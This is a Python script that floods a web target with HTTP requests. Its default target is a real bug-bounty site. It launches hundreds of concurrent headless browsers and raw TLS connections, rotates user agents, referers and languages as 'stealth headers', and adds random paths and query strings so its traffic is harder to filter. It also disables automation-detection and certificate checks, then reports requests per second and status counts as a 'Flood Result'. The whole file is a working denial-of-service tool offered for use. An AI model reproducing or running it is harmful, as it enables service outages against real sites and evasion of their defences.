import asyncio
import random
import time
import os
from playwright.async_api import async_playwright
import json
import base64
import hashlib
import string
import struct
import socket
import ssl
import urllib.parse
from datetime import datetime

TARGET_URL = os.getenv("TARGET_URL", "https://hackerone.com/")
DURATION = int(os.getenv("DURATION", "20"))
CONCURRENCY = int(os.getenv("CONCURRENCY", "300"))
REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "500"))
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/116.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
]
ACCEPT_LANG = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8"]
REFERERS = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.linkedin.com/",
    "https://www.reddit.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://duckduckgo.com/"
]
success = 0
fail = 0
status_count = {}

class StealthHeaders:
    @staticmethod
    def generate_random_headers():
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept-Language": random.choice(ACCEPT_LANG),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Referer": random.choice(REFERERS),
            "DNT": str(random.randint(0, 1)),
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0"
        }

class RequestFuzzer:
    @staticmethod
    def generate_random_path():
        chars = string.ascii_letters + string.digits + "/-_.~"
        return ''.join(random.choice(chars) for _ in range(random.randint(5, 20)))
    
    @staticmethod
    def generate_random_query_params():
        params = {}
        num_params = random.randint(1, 8)
        for _ in range(num_params):
            key = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(3, 10)))
            value = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(3, 15)))
            params[key] = value
        return urllib.parse.urlencode(params)
    
    @staticmethod
    def fuzz_url(base_url):
        parsed = urllib.parse.urlparse(base_url)
        path = parsed.path
        query = parsed.query
        
        if random.random() > 0.7:
            path += "/" + RequestFuzzer.generate_random_path()
        
        if random.random() > 0.5:
            if query:
                query += "&" + RequestFuzzer.generate_random_query_params()
            else:
                query = RequestFuzzer.generate_random_query_params()
        
        return urllib.parse.urlunparse((
            parsed.scheme,
            parsed.netloc,
            path,
            parsed.params,
            query,
            parsed.fragment
        ))

class DirectRequestHandler:
    @staticmethod
    async def make_direct_request(url, headers):
        try:
            parsed_url = urllib.parse.urlparse(url)
            host = parsed_url.netloc
            path = parsed_url.path
            if parsed_url.query:
                path += "?" + parsed_url.query
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, 443, ssl=context),
                timeout=10
            )
            
            request = f"GET {path} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            for key, value in headers.items():
                request += f"{key}: {value}\r\n"
            request += "\r\n"
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await reader.read(1024)
            writer.close()
            await writer.wait_closed()
            
            if response:
                status_line = response.split(b'\r\n')[0]
                status_code = int(status_line.split(b' ')[1])
                return status_code
            return 0
        except Exception:
            return None

async def attack(playwright, worker_id):
    global success, fail, status_count
    
    browser = await playwright.chromium.launch(
        headless=True,
        args=[
            "--disable-web-security",
            "--disable-features=IsolateOrigins,site-per-process",
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--disable-setuid-sandbox",
            "--disable-software-rasterizer",
            "--disable-extensions",
            "--disable-plugins",
            "--disable-images",
            "--disable-javascript",
            "--disable-background-timer-throttling",
            "--disable-renderer-backgrounding",
            "--disable-backgrounding-occluded-windows",
            "--disable-client-side-phishing-detection",
            "--disable-crash-reporter",
            "--disable-features=TranslateUI",
            "--disable-ipc-flooding-protection",
            "--enable-automation",
            "--password-store=basic",
            "--use-mock-keychain",
            "--single-process"
        ]
    )
    
    context = await browser.new_context(
        viewport={"width": 1920, "height": 1080},
        user_agent=random.choice(USER_AGENTS),
        extra_http_headers={"Accept-Language": random.choice(ACCEPT_LANG)},
        java_script_enabled=False,
        ignore_https_errors=True
    )
    
    start_time = time.time()
    end_time = start_time + DURATION
    
    while time.time() < end_time:
        tasks = []
        headers = StealthHeaders.generate_random_headers()
        
        for _ in range(REQ_PER_LOOP):
            if random.random() > 0.3:
                url = RequestFuzzer.fuzz_url(TARGET_URL)
                tasks.append(context.request.get(url, headers=headers, timeout=10000))
            else:
                tasks.append(DirectRequestHandler.make_direct_request(
                    RequestFuzzer.fuzz_url(TARGET_URL), 
                    headers
                ))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for res in results:
            if isinstance(res, Exception):
                fail += 1
                status_count["exception"] = status_count.get("exception", 0) + 1
            else:
                if res and 200 <= res < 300:
                    success += 1
                    status_count[res] = status_count.get(res, 0) + 1
                else:
                    fail += 1
                    if res:
                        status_count[res] = status_count.get(res, 0) + 1
                    else:
                        status_count["timeout"] = status_count.get("timeout", 0) + 1
        
        await asyncio.sleep(random.uniform(0.1, 0.5))
    
    await browser.close()

async def main():
    start_time = time.time()
    
    async with async_playwright() as p:
        tasks = [attack(p, i) for i in range(CONCURRENCY)]
        await asyncio.gather(*tasks)
    
    total = success + fail
    elapsed = time.time() - start_time
    
    print(f"\n=== Flood Result ===")
    print(f"Target: {TARGET_URL}")
    print(f"Duration: {elapsed:.2f} seconds")
    print(f"Concurrency: {CONCURRENCY}")
    print(f"Requests per loop: {REQ_PER_LOOP}")
    print(f"Total requests: {total}")
    print(f"Success (2xx): {success}")
    print(f"Fail/Blocked: {fail}")
    print(f"RPS: {total / elapsed:.2f}")
    print("Status breakdown:")
    for status, count in sorted(status_count.items()):
        print(f"  {status}: {count}")

if __name__ == "__main__":
    asyncio.run(main())
